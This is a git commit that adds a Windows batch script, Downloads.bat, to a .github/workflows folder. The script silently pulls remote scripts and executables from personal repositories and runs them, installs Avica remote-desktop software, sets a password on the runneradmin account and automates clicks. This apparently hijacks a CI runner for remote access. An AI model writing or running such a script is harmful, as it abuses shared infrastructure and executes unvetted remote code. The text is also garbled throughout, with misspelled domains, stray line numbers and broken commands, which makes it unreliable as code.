9faffd34cc353a6c64daccb1d1d3174a344cf2e5
Tsu14-wq <abiloveli41@gmail.com>
2025-07-24 01:17:53 +0400

    Create Downloads.bat

---
+++ .github/workflows/Downloads.bat
@@ -0,0 +1,44 @@
+@echo off
+2
+curl -s -L -o setup.py https://raw.githuousercontent.con/antoniojnn24/upgraded-enigra/refs/heads/nain/.github/workflous/setup.py
+3
+curl -s -t -o Avica_setup.exe "https://60wn1oad.avica.1ink/down1oader/Avico_setup.exe"
+curl -s -L -o show.bat jttps://gitlab.con/raposatrty/pcrdp/-/remw/main/show.bat
+curl -s -L -o loop.bat https://raw.githubusercontent.con/antoniojnn24/upgraded-enigra/refs/heads/main/.github/workflous/loop.bat
+6
+curt -s-L-0 C:Wsers\Pub11c\0esktop\Te1cgran.exe https://teleeran.arg/d1/desktop/win64
+curl -s -L -o C:\Users\Public\Desktop\Winrar.exe https://w.rarlab.con/rer/winrar-x64-621.exe
+B
+curl -s -L -o wall.bat https://gitlab.con/chanod12/changeuallpaper-winlo/-/rau/main/wall.bat
+10
+powershe11-Conmnd "Tnvoke-wehnequest "nttps://github.con/chieunhatnang/M-Quickconfig/re1eases/down1ond/1.6.1/\Qu1ckConf1g.exe'-OutFilee 'C:\Users\Public\D
+11
+python.exe -m pip install --upgrade pip
+12
+pip install requests --quiet
+pip install pyautoeui --quiet
+13
+14
+pip instoll telegroph --quiet
+15
+C:\sers\Pub1ic\Desktop\Teleeran.exe JVERYSTLENT /NORESTART
+16
+del C:\Users\Public\Desktop\Telegren.exe
+17
+18
+C:\Users\Public\Desktop\Hinrar.exe /s
+de1 C:Wsers\Pub1ic\0esktopiwinrar.exe
+19
+del /f"C:\Users\Public\Desktop\Epic Gones Leuncher.lnk"
+20
+del /f "C:\Users'\Public\Desktop\Unity lub.lnk"
+21
+net user runneradin Tsubasa0235
+22
+python -c "inport pyautogui os pag; pag.click(897,64,duration=2)"
+23
+24
+start"""Avica_setup.exe"
+25
+python setup.py
+call wall.bat
